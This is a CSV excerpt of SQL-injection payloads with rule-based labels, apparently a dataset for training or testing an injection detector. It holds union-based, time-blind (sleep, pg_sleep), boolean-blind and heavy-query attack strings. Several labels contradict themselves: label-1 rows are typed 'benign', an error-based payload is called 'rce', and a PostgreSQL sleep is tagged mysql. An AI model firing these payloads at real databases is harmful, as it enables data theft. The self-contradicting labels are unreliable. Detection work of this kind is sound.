row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
2550,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( 'wusq' = 'wusq",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
2551,"1%"" ) order by 1#",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2552,"1"" ) as zopq where 2680 = 2680",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2553,"-8844"" ) ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
2554,"1 ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( 4666 = 4666",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
2555,1' or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and 'ukoc' like 'ukoc,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
2556,"-4222' ) union all select 9267,9267,9267,9267,9267,9267--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2557,"-2375 union all select 1573,1573,1573,1573#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2558,"1' ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
2559,1' ) ) as yqcl where 5026 = 5026 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
2560,"-6803"" ) order by 1#",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2561,"select * from generate_series ( 9709,9709,case when ( 9709 = 7795 ) then 1 else 0 end ) limit 1--",1,,heavy_query,generic,0.95,generate_series ( detected — heavy_query injection (priority 6) on generic,rule-based
2562,"-7409"" ) ) union all select 3145,3145,3145--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2563,"-4926"" where 8152 = 8152 or 4339 = 5547#",1,,boolean_blind,generic,0.95,8152 = 8152 or detected — boolean_blind injection (priority 8) on generic,rule-based
